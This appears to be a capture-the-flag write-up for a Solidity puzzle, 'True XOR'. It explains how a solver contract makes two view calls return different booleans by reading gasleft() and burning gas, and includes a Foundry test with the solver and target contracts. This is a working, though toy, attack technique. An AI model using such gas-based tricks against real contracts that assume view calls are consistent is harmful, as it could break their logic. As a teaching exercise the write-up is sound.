## True XOR attack

To resolve the condition (p && q) != (p || q) we need to return one time true and the other time false when then contract is called via IBoolGiver(target).giveBool().

As we need to implement IBoolGiver interface in our solver contract the giveBool() function needs to be a view function and can't change any state variable and needs to adhere to the staticcall conditions.

So it's not possible to update the state to decide what to return, but we can use some opcodes like gasleft() in our view function.

As we need to send the transaction to the TrueXOR via our EOA address we can also define with how much gas we want to call the contract.
This we can use to differntiate if we going to give back true or false.

We will return false if we have more than X gas, but before we return we consume all gas until we have less for the next call we will receive where we will return true then.

## Test
forge test --match-contract=TrueXORTest

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

contract TrueXORTest is Test {

    Solver solver;
    TrueXOR trueXOR;

    address userEOA = address(1);

    function setUp() public {        
        trueXOR = new TrueXOR();
        solver = new Solver();
    }

    function testAttack() public {
        vm.prank(userEOA, userEOA); // we send the transaction as the user
        require(trueXOR.callMe{gas: 25000}(address(solver)));
    }
}

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract Solver is IBoolGiver {

  function giveBool() external view override returns (bool result) {
    if(gasleft() > 20000) {
      while(gasleft() > 20000) {
        continue; // just guzzle some gas until we can be sure that out next call to our Solver will result in the other condition
      }
      return false;
    }

    return true;
  }
}

contract TrueXOR {
  function callMe(address target) external view returns (bool) {
    bool p = IBoolGiver(target).giveBool();
    bool q = IBoolGiver(target).giveBool();
    require((p && q) != (p || q), "bad bools");
    require(msg.sender == tx.origin, "bad sender");
    return true;
  }
}
```